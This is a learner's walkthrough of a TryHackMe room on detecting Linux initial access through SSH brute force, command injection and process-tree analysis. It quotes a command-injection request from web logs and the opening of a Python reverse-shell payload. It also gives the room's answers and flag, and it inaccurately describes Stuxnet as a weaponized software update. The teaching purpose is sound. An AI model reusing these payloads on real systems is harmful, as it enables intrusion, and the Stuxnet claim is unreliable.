<h1> Linux Threat Detection 1 </h1>

Welcome to this walkthrough of the Linux Threat Detection 1 Room from the Linux Security Module part of the SOC Level 1 Path

This module is similar to the Windows Security Module but for Linux, where we will go through the MITRE attack framework and see how we can find various techniques in a Linux enviroment. 

This room will focus on how to detect Initial Access Techniques from ssh attacks and services breaches.

<img width="1410" height="144" alt="Screenshot 2026-04-04 at 6 16 50 PM" src="https://github.com/user-attachments/assets/ab1882d0-71d3-4f59-935f-32c0e3d806da" />

I hope this walkthorugh will help you clear any confusion regarding this room and you will learn a thing or two about cybersecurity.

Let's Begin!

Task 1 - Introduction
Linux is still used in our networks, therefore they are a major means which they get attacked. 
We must be ready to detect any inital access techniques in our linux system 

It is important you have knowledge of the MITRE Att&ck framework, Linux commands, and how to work with Linux logs.
It is reccomended to have completed these rooms before continuing with this room

Questions:
<br />
Question 1 - Read the Question Above
<br />
A: No answer needed

Task 2 - Initial Access via SSH
In this task, we learn that SSH is a very widely used service that allows users to connect remotely. 
However it can be used by attackers to gain access to our systems.

There are two common ways in which you can connect remotely via SSH: Password Authentication and SSH Key-Based Authentication
* Password Authentication is what we are mostly used to: username and password. We send to the ip address we are logging to the user we want to log into, and the password. If there is an ssh server configured, and if our credentials are correct, then we will be able to remotely log into our system.
  Password Autentication Syntax: ssh [user]@[ip address], you will then be prompted for the password


* SSH Key-Based Authentication is also known as Passwordless authentication because it relies on keys. There are two keys: Public key and Private key. The public key is for the server and the private key is for the client. In other words, the Public key is kept on the system you want to log into remotely, and the private key is kept on the system you are using to connect remotely. This is a passwordless method because it doesnt really on a password to prove an identity, rather, the cleint proves it owns the Private Key in order to gain connection. Key-Based Authentication is nearly impossible to brute force, making it safer than Password Authentication. However if someone obtains a copy of your Private Key, then your system is compromised. That is why it is best practice to add a passphrase to the Private Key to add an additional layer of defence.
  Passwordless Authentication Syntax: ssh [user]@[ip address], unlike above, you will not be prompted by the password

Hopefully this was usefull reminder of how ssh works!

With this information, we can see that we need to look out for:
  Weak Passwords in Password Authentication and access to our Private Key File

Questions:
<br />
Question 1 - When did the ubuntu user log in via SSH for the first time?
<br />
Answer Example: 2023-09-16.

We need to remember that from the previous room that the way we look for authentication events is through the auth.log logs

<img width="1382" height="401" alt="Screenshot 2026-04-04 at 7 07 37 PM" src="https://github.com/user-attachments/assets/2acde9c9-d0a1-465a-b856-58c5d4bf22b0" />

However this is to much information and going through it line by line will take forever, hence we will use the grep tool.
In order for the grep tool to be useful we need to know keywords to help us find what we are looking for.

Since we are looking for a succesful ssh log in, we grep for the keywords "ssh" and "Accept" since you find these words on log entries that log succesful ssh logins.
<img width="1419" height="290" alt="Screenshot 2026-04-04 at 7 12 46 PM" src="https://github.com/user-attachments/assets/e2a2fea0-fa3a-461a-bdb4-3aefba2a6ea5" />

You will see here that the first entry doesnt have the year, however by doing further analysis you can infer that the year for these logs is 2024. 
<img width="1423" height="315" alt="Screenshot 2026-04-04 at 7 17 48 PM" src="https://github.com/user-attachments/assets/91e2a16e-ad1c-49d2-a9f5-00ece379dd90" />

Something that was confusing for me is that how did the format change. If you grep for SSH logs, you can see that the SSH Servce (SSHD) restarted. When SSHD restarted, it could be that the logging system changed. 
The "Oct 22 08:55:25" logs follow the standard syslog timestamp format typical of the rsyslog system, while the later entries with the year and more accurate time use ISO 8601 format, which is typical of journald. Basically the way logs were processed changed.
Hope you found this helpful
<img width="1422" height="311" alt="Screenshot 2026-04-04 at 7 21 57 PM" src="https://github.com/user-attachments/assets/93adaa7c-44c4-4c7c-9840-f90c36909d98" />
Answer: 2024-10-22

Question 2 - Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)
This question is asking whether the user used Password or Keys to authenticate.
From the screenshot, you can see in the first entry that the authentication method used was 'publickey' meaning SSH Keys.
You will see at the bottom of the screenshot a succesful authentication via password.
<img width="1422" height="311" alt="Screenshot 2026-04-04 at 7 21 57 PM" src="https://github.com/user-attachments/assets/93adaa7c-44c4-4c7c-9840-f90c36909d98" />
Answer: YEA

Task 3 - Detecting SSH Attacks
We have seen how a sucessful SSH login looks like. Now, we will learn how to detect whether a login is malicious or not.

The key to figure out is by looking at the context and correlation of other logs.

In the figured labeled Successful SSH Logins. With the ansible login, we can see that she used a key, which as we have seen is safer than using a password method. You can also analyze that the login was made from an internal ip address.
However, with the other logs for jsmith, we can analyze that a password authentication and an external ip address was used which raises a red flag.

We will practice this answering the questions on this task.

Questions:
<br />
Question 1 - When did the SSH password brute force start?
<br />
Answer Format: 2023-09-15.

This question tells us that we are analyzing an SSH brute force attack.

To recap, a brute force attack is an authentication attack where an attacker attempts to gain access by systematically trying multiple password combinations. This attack typically happens in an automated manner.

Brute force attacks can be identified in logs by:
* Repeated failed login attempts within a short period of time
* Multiple authentication attempts originating from the same IP address
* Attempts targeting one or multiple user accounts
* High-frequency login attempts indicating automation

With this in mind, we now know what we are looking for.

To analyze the logs, remember we will need to look at the auth.log logs since we are looking for authorization and authentication activity.

Since a characteristic of a brute force attack is a lot of failed login attempts, let us grep for "failed"

<img width="1421" height="726" alt="Screenshot 2026-04-05 at 1 28 38 PM" src="https://github.com/user-attachments/assets/86d031c0-8b0a-48cc-ba62-261f4b831eb3" />

We can analyze that there are multiple failed attempts in a short amount of time from the 193.46.255.33 ip address.

We can see that there is a Failed Password attempt from 197.39.195.136, but the brute force attack did not begin here. This attempt is not part of the brute force attack since there is only one attempt in a short amount of time. 

Answer: 2025-08-21

Question 2 - Which four users did the botnet attempt to breach?
<br />
Answer Format: Separate by a comma, in alphabetical order.

From this question we can see that the system is being attacked by a botnet, meaning that the attacker is using multiple ip addresses to brute force.

Looking at the results again
<img width="1424" height="729" alt="Screenshot 2026-04-05 at 1 36 20 PM" src="https://github.com/user-attachments/assets/e383bcfd-105f-4e53-a5ca-6c0af1edfb76" />

We see that the ip address 193.46.255.33 was trying to access user root multiple times in a short amount of time.
We can add the user "root" to our list

We also notice that same ip address accessing user sol. Even though there was only one attempt, from the analysis we can conclude that the ip address is part of the botnet.
We can the user "sol" to the list.

We also see that the 80.94.95.112 is making multiple attempts to the same user (roy) in a short ammount of time.
We will add "roy" to the list.

Looking at the later events
<img width="1418" height="725" alt="Screenshot 2026-04-05 at 2 06 13 PM" src="https://github.com/user-attachments/assets/139c36c1-748f-48fc-9523-bcf39b71fe67" />

We can see 80.94.95.112 is making multiple attempts to the user user in a short ammount of time.
We will add "user" to the list

We have found our four users

Answer: root, roy, sol, user

Question 3 - Finally, which IP managed to breach the root user?
<br />
We know of two ip addresses part of the botnet attack: 193.46.255.33 and 80.94.95.112.

We will now filter through the auth.log to look for a sucessul login to the root user from one of these ip addresses

<img width="1168" height="71" alt="Screenshot 2026-04-05 at 3 41 27 PM" src="https://github.com/user-attachments/assets/7273e9a8-f91a-47ef-afc9-f781d4abcaae" />

Even though that the ip address is not part of the initial 2 ip addresses we identified as part of the botnet, looking back at the logs we can see the participation of the 91.224.92.79 address in the botnet.

I ran the same command as in question 2 of this same task: 
cat /var/log/auth.log | grep "ssh" | grep -i "failed"
<img width="1421" height="177" alt="Screenshot 2026-04-05 at 3 46 37 PM" src="https://github.com/user-attachments/assets/b0d2bebe-63ac-46db-b4b6-601c9c41e86b" />

Answer: 91.224.92.79

Task 4 - Initial Access via Services

Not only do attackers use SSH to gain initial access to your system. but also through services.
In order to check for a potential, we are going to have to analyze logs related to our services, like our web servers.

In the example of the image, TryPingMe Web Logs, we can see that our web server is vulnerable for command injection. Command injection is a vulnerability where an attacker can execute commands on a server because user input is improperly handled. The attacker was able to run linux commands like whoami, hello, and ls in the web server. The attacker shouldn't be able to run these commands. The backend was not coded safely in order to sanitize the user input which an attacker can exploit and gain initial access.

For the questions, we are going to analyze TryPingMe web logs. It seems like TryPingMe is running on a nginx web server. To analyze then the logs, we will find them in /var/log/nginx/access.log

Question 1 - What is the path to the Python file the attacker attempted to open?
<br />
We are told in the question we are looking for a python file. Python files have an extension of .py, so let us search for ".py" in the access.log

<img width="1417" height="136" alt="Screenshot 2026-04-05 at 5 16 00 PM" src="https://github.com/user-attachments/assets/8d809781-39bf-4ad3-a2b9-740e1c702a46" />

From the first entry, we can see that there was a GET command for a main.py file.
GET /ping?host=;cat+/opt/trypingme/main.py HTTP/1.1" 200 330 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36

A quick recap on URI:
* GET - is the HTTP request method. This method indicates that the client is requesting something from the server
* /ping - is the endpoint the client accessed.
* ? - declares that the following are parameters, like variables, that the client can set, in this case the parameter that was set is host
Host will have a value equal to ";cat+/opt/trypingme/main.py"

The most likely use of the backend code is "ping <host>".
For example the user would write 8.8.8.8, the URI looks like "/ping?host=8.8.8.8" and the code looks like "ping 8.8.8.8"

However in this case we have ";cat+/opt/trypingme/main.py". The ";" closes the ping command and introduces the cat command wanting to access read the /opt/trypingme/main.py
The + symbol represents a space in URI encoding.

The attacker is trying to access /opt/trypingme/main.py

Answer: /opt/trypingme/main.py

Question 2 - Looking inside the opened file, what's the flag you see there?
We now need to find the file /opt/trypingme/main.py.

If we simply cat the file we get our answer.

<img width="582" height="616" alt="Screenshot 2026-04-05 at 5 26 42 PM" src="https://github.com/user-attachments/assets/687ea964-658a-4f30-b47b-33f04d645c70" />

This question is pretty simple. It could be confusing in where to start to look for the file. We know that the file is in /opt/trypingme/main.py. We can start by using the cat command directly first. 

Answer: THM{i_am_vulnerable!}

Task 5 - Detecting Service Breach
This task focuses on learning to use process analysis in order to analyze an attacker's potential initial access.
Application logs are not always available, it best to rely on process tree analysis.
A process tree is a hierarchical view of how process started (spawned) which other process.
This relationship is often described as a parent / child relationship that when you zoom out and see the whole relationships formed, it looks like a family tree, hence the name the process tree.

We will use ausearch to look through audit daemon logs we looked at the previous room where it focuses on analyzing system calls.
Two values of a audit log file is: PROCTITLE AND SYSCALL
The PROCTITLE and SYSCALL records represent the same process execution event. 
* The PROCTITLE provides the human-readable command that a user wrote
* The SYSCALL entry shows the underlying system call (execve) used to execute that command, along with metadata such as process ID, user, and execution status.
The SYSCALL entry includes the parent process ID (ppid), which identifies the process that spawned the current process.
We can learn why a process is running from analyzing the parent process.

We will use ausearch to look through the audit logs

Questions
Question 1 - What is the PPID of the suspicious whoami command?

in order to answer this question, we are given a keyword we can look for: "whoami".
We can run the command: ausearch -i -x "whoami"
  where the i flag gives you human readable output, and the x flag lets you search for the executabl name.

<img width="1424" height="225" alt="Screenshot 2026-04-05 at 5 48 23 PM" src="https://github.com/user-attachments/assets/6b9007d9-ed89-4df7-90b4-8674b8bbdd34" />

From the picture, we can see the the ppid is 1018

Answer: 1018

Question 2 - Moving up the tree, what is the PID of the TryPingMe app?

We know that the user used the TryPingMe app in order to get to inject his own commands. In order to find the id of trypingme we can go up the process tree similar to the example THM provided.

<img width="1253" height="382" alt="Screenshot 2026-04-05 at 5 50 05 PM" src="https://github.com/user-attachments/assets/22c8fca0-cfaa-4b72-9036-60c8b4a8cf53" />

I continue going up the tree until I reach the TryPingMe app process.

<img width="1427" height="609" alt="Screenshot 2026-04-05 at 5 56 56 PM" src="https://github.com/user-attachments/assets/0d454582-6700-4906-9fbc-47aceb9139c5" />

How do you know that is the app process?
The proctitle shows /usr/bin/python3 /opt/trypingme/main.py, meaning the Python interpreter (exe=/usr/bin/python3.12) is executing the application’s main script located under /opt/trypingme. This indicates that this process represents the application runtime rather than a child or auxiliary process.

Using -x trypingme will not work because the -x flag filters on the executable (exe field) from the SYSCALL event. In this case, the executable is /usr/bin/python3.12, not trypingme. Therefore, you would need to use -x /usr/bin/python3.12, but this may return many unrelated results since multiple scripts can be executed by the Python interpreter.

An interpreter is a program that translates and executes code line by line at runtime, converting it into machine instructions as it runs. This is what is making your code execute, run.

Answer: 577

Question 3 - Which program did the attacker use to open a reverse shell?

We know that the attacker used TryPingMe to gain access to the system. Let us then analyze what are the child processes of the TryPingMe process by using the following command: 
ausearch -i --ppid 577

<img width="1423" height="183" alt="Screenshot 2026-04-05 at 6 20 03 PM" src="https://github.com/user-attachments/assets/2dfd1b2e-9fbc-4b8c-9812-af8facbd7646" />

In the last entry, we see the following command in the proctitle: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.

This is the beginning of a Python reverse shell payload:
* It imports socket which is used to create a connection
* SOCK_STREAM indicates the creation of a TCP connection
* s.connect(("10.x.x.x", PORT)) is the connection to an IP.

In fact, we can see the full command in the image in Task 4, Question 1.

Answer: Python

Task 7 - Advanced Initial Access

THM teaches that even though it is not as common for phishing and USB attacks to be succesful compared to windows, we still need to be aware of it.

Supply chain compromise is also a common initial access technique, where an attacker targets software or services that are distributed to multiple downstream clients. By compromising a trusted vendor or update mechanism, the attacker can propagate malicious code to many organizations simultaneously.

A well-known example is the Stuxnet attack, in which attackers weaponized legitimate software updates. Organizations that trusted and installed the update were unknowingly compromised.

In order to detect these attack, we need to analyze the process tree.

Questions 
Question 1 - Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?
This is a Supply Chain Compromise. Trusted apps were compromised to run malicious code.

Answer: Supply Chain Compromise

Question 2 - Which detection method can you use to detect a variety of Initial Access techniques?
Answer: Process Tree Analysis 

Conclusion

In this room we learened:
* Analysis on authentication logs 
* Process Tree Analysis
Hope this walkthrough was helpful!

    
